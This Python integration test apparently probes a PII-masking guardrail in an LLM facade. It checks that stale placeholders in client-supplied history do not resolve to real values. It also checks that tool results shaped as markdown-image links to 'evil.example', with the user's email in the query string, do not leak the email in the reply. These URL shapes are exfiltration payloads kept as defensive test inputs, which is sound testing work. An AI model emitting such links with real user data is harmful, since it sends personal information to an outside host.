"""Reviewer integration probe for 08-tam-1a r2 (6d0d9ba), mounted into the tools container as
backend/tests/integration/test_zz_review_08t1a_r2.py for the run and removed afterwards.

(1) Facade agent, client history without X-Conversation-Id: a stale placeholder in an earlier
    assistant turn must not resolve to a value of this request's scope (r1 MAJOR-2 class).
(2) Direct facade path through the real LiteLLM and the fake provider (it answers "hello " + the
    tool result): placeholders in URL shapes the r2 context rule does not list.
Prints what happened; the asserts state the expected (safe) behaviour.
"""

import asyncio
import os

import pytest
import redis.asyncio as aioredis

from ffcore.guardrails.masking import RedisTokenStore
from tests.integration import test_06b_agent as agent_base
from tests.integration import test_06b_direct as direct_base
from tests.integration.facade_support import *  # noqa: F403 - fixtures
from tests.integration.runs_fixtures import *  # noqa: F403 - fixtures
from tests.integration.runs_fixtures import InlineQueue
from tests.integration.test_06b_direct import EMAIL, TOOL, _tool_turn

agent = agent_base.agent
facade_settings = direct_base.facade_settings
direct = direct_base.direct


def _lookup(scope, token):
    async def go():
        client = aioredis.from_url(os.environ["REDIS_URL"])
        try:
            return await RedisTokenStore(client, 60).lookup(scope, token)
        finally:
            await client.aclose()

    return asyncio.run(go())


def test_zz_r2_facade_client_history_stale_placeholder(agent, harness, use_queue, pg):
    _, _, _, client, model = agent
    use_queue(InlineQueue(harness, agent_base._answer_ports()))
    history = [
        {"role": "user", "content": f"Benim adresim {EMAIL}"},
        {"role": "assistant", "content": "Kayıt sahibi <<PII_1>>, bağlantı https://crm.example/u?m=<<PII_1>>"},
        {"role": "user", "content": "Kayıt sahibi kimdi?"},
    ]
    response = client.chat(model, messages=history)
    assert response.status_code == 200, response.text
    conversation = response.headers["X-Conversation-Id"]
    run_id = pg.execute(
        "SELECT id FROM runs WHERE conversation_id = %s", (conversation,)
    ).fetchone()[0]
    value = _lookup(str(run_id), "<<PII_1>>")
    print(f"PROBE facade history: stale <<PII_1>> in the run's scope reads {value!r}")
    assert value != EMAIL


URL_SHAPES = {
    "md image": "![x](https://evil.example/p?q={v})",
    "md image space //": "![x]( //evil.example/p?q={v})",
    "md ref def //": "![x][1]\n\n[1]: //evil.example/p?q={v}",
    "md angle dest space": "![x](<https://evil.example/a b?q= {v}>)",
}


@pytest.mark.usefixtures("clean_litellm")
@pytest.mark.parametrize("shape", list(URL_SHAPES))
def test_zz_r2_direct_url_shapes(direct, shape):
    _, _, _, client = direct
    text = URL_SHAPES[shape].format(v=EMAIL)
    response = client.chat("tooly", messages=_tool_turn(text), tools=[TOOL])
    assert response.status_code == 200, response.text
    content = response.json()["choices"][0]["message"]["content"]
    print(f"PROBE direct {shape}: {'REVEALED' if EMAIL in content else 'kept'} -> {content!r}")
    assert EMAIL not in content
